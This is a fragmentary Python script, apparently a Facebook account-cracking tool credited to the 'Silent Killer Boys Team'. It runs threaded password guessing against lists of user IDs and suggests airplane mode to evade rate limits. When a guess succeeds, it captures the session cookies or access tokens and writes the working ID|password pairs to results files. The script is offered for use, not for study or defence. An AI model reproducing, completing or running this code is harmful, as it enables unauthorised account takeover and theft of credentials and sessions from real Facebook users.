...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : Md. Alamin Islam
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : Silent Killer Boys Team
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : ALAMIN-XD89
\033[1;90m══════════════════════════════════════════════════              
"""%(Y,R,G,P))
    ...
    if ___menu___ in ['1','01']:
        ...
        if ___hasilz___ in ['1','01']:
            try:
                ...
                exit("%s[%s***%s]%s ALAMIN Ok.txt There isn't any"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Ok.txt')
            print("\n%s[%s***%s]%s Total ALAMIN Ok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
        elif ___hasilz___ in ['2','02']:
            try:
                ___cp___ = open('Results/Cp.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s ALAMIN Cp.txt There isn't any"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Cp.txt')
            print("\n%s[%s*%s]%s Total ALAMIN Cp.txt :%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
        ...
        os.system("xdg-open https://wa.me/+8801915935712?text=Hallo%20Noob%20Xploit")
        exit()
...
def ___metode___():
    ...
    if ___metode___ in ['1','01']:
        ...
        print("\n%s[%s**%s]%s ALAMIN Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%s**%s]%s ALAMIN Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        ...
        print("\n%s[%sâ€¢%s]%s ALAMIN Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s ALAMIN Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
...
def mbasic(ids, uid, pwx, **kwargs):
    ...
    sys.stdout.write(
        "\r\x1b[1;97m[A4AM8N] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print("\rSKB\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\rSKB\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
    ...
    try:
        for pw in pwx:
            ...
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\rSKB\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
